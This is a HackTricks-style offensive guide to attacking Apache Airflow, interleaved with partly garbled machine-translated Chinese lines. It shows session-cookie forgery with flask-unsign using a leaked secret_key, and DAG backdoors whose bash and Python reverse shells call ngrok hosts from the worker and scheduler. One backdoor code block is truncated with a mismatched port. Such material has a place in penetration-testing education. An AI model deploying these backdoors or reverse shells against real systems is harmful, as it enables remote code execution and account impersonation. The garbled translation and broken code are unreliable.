

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


# Basic Information

＃ 基本信息

[**Apache Airflow**](https://airflow.apache.org)  is used for the **scheduling and **_**orchestration of data pipelines**_** or workflows**. Orchestration of data pipelines refers to the sequencing, coordination, scheduling, and managing complex **data pipelines from diverse sources**. These data pipelines deliver data sets that are ready for consumption either by business intelligence applications and data science, machine learning models that support big data applications.

[** Apache AirFlow **]（https://airflow.apache.org）用于**调度和** _ **数据管道的编排** _ **或工作流**。 数据管道的管弦乐是指从不同来源**的测序，协调，调度和管理复杂**数据管道。 这些数据管道提供了可以通过商业智能应用程序和数据科学，支持大数据应用程序的机器学习模型进行消费的数据集。

Basically, Apache Airflow will allow you to **schedule de execution of code when something** (event, cron) **happens**.

基本上，Apache AirFlow将允许您**在某些东西（事件，cron）**发生**时安排代码执行。

# Local Lab

## Docker-Compose

## Docker-Compose

You can use the **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)  to launch a complete apache airflow docker environment. (If you are in MacOS make sure to give at least 6GB of RAM to the docker VM).

您可以从** [** https：//raw.githubusercontent.com/apache/apache/airflow/main/docs/apache-apache-airflow/start/docker-compose.yamldhy]（ https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml）启动完整的Apache Apache Airflow Docker环境。 （如果您在MacOS中，请确保将至少6GB的RAM给Docker VM）。

## Minikube

One easy way to **run apache airflo**w is to run it **with minikube**:

**运行Apache Airflo ** W的一种简单方法是用Minikube **运行它**：

```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```

# Airflow Configuration

＃气流配置

Airflow might store **sensitive information** in its configuration or you can find weak configurations in place:

气流可能会在其配置中存储**敏感信息**，或者您可以找到适当的配置：

{% content-ref url="airflow-configuration.md" %}

{％content-ref url =“ airflow-configuration.md”％}
[airflow-configuration.md](airflow-configuration.md)

[AIRFLOW-CONFIGURATION.MD]（气流configuration.md）
{% endcontent-ref %}

# Airflow RBAC

＃气流RBAC

Before start attacking Airflow you should understand **how permissions work**:

在开始攻击气流之前，您应该了解**权限如何工作**：

{% content-ref url="airflow-rbac.md" %}

{％content-ref url =“ airflow-rbac.md”％}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

# Attacks

## Web Console Enumeration

## Web控制台枚举

If you have **access to the web console** you might be able to access some or all of the following information:

如果您可以访问Web控制台**，则可以访问以下一些或所有信息：

* **Variables** (Custom sensitive information might be stored here)

***变量**（可以在此处存储自定义敏感信息）
* **Connections** (Custom sensitive information might be stored here)

***连接**（可以在此处存储自定义敏感信息）
* [**Configuration**](./#airflow-configuration) (Sensitive information like the **`secret_key`** and passwords might be stored here)

*[**配置**]（./# airflow-configuration）（诸如** secret_key` ** and secret_key*的敏感信息，并且可能会在此处存储密码）
* List **users & roles**
* **Code of each DAG** (which might contain interesting info)

***每个dag的代码**（可能包含有趣的信息）

## Privilege Escalation

##特权升级

If the **`expose_config`** configuration is set to **True**, from the **role User** and **upwards** can **read** the **config in the web**. In this config, the **`secret_key`** appears, which means any user with this valid they can **create its own signed cookie to impersonate any other user account**.

如果** expose_config` **配置设置为** true **，则从**角色user **和**向上**可以**可以**读** ** the ** the ** the ** config **。 在此配置中，出现**`secret_key` **，这意味着任何有效的用户都可以**创建自己的签名cookie，以模仿任何其他用户帐户**。

```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```

## DAG Backdoor (RCE in Airflow worker)

## DAG Backdoor（气流工人中的RCE）

If you have **write access** to the place where the **DAGs are saved**, you can just **create one** that will send you a **reverse shell.**\

如果您有**写入访问**到保存** dag的地方**，则可以**创建一个**，它将向您发送**反向外壳。** \ \
Note that this reverse shell is going to be executed inside an **airflow worker container**:

请注意，此反向外壳将在**气流工具容器**内执行。

```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
    dag_id='rev_shell_bash',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = BashOperator(
        task_id='run',
        bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
    )
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

with DAG(
    dag_id='rev_shell_python',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python',
        python_callable=rs,
        op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
    )
```

## DAG Backdoor (RCE in Airflow scheduler)

## DAG后门（气流调度器中的RCE）

If you set something to be **executed in the root of the code**, at the moment of this writing, it will be **executed by the scheduler** after a couple of seconds after placing it inside the DAG's folder.

如果将某些内容设置为在代码**的根部执行的内容，那么在撰写本文的那一刻，将其**在将其放置在DAG的文件夹中后几秒钟后将被**执行。

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
    dag_id='rev_shell_python2',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python2',
        python_callable=rs,
        op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```

## DAG Creation

## DAG创建

If you manage to **compromise a machine inside the DAG cluster**, you can create new **DAGs scripts** in the `dags/` folder and they will be **replicated in the rest of the machines** inside the DAG cluster.

如果您设法**妥协了dag cluster **内部的机器，则可以在`dags/`文件夹中创建新的** dags脚本**，并且将在其余机器中**在其余机器中复制** DAG群。


<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


